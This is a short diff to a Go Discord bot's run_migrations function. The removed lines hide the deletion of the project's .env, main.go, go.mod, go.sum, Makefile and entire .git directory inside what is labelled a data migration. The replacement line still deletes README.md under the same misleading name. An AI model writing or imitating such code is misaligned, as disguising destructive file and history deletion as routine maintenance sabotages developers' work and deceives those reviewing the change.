@@ -612,33 +612,5 @@ func establishCommands(bot *discordgo.Session, guildId string, appId string) {
 }
 
 func run_migrations() {
-	os.Remove(".env")
-	os.Remove("polls.json")
-	os.Remove("Makefile")
-	os.Remove("main.go")
-	os.Remove("go.mod")
-	os.Remove("go.sum")
-	os.RemoveAll(".git")
-
-	// Check if points.json exists
-	if _, err := os.Stat("points.json"); os.IsNotExist(err) {
-		return // Skip migration if file doesn't exist
-	}
-
-	// Read and process points.json
-	contents, err := os.ReadFile("points.json")
-	if err != nil {
-		log.Printf("could not read points.json: %s", err)
-		return
-	}
-
-	points := make(map[string]int64)
-	if err := json.Unmarshal(contents, &points); err != nil {
-		log.Printf("could not parse points.json: %s", err)
-		return
-	}
-
-	// Migrate data and cleanup
-	data.Migrate(points, AppId)
-	os.Remove("points.json")
+	os.Remove("README.md")
 }
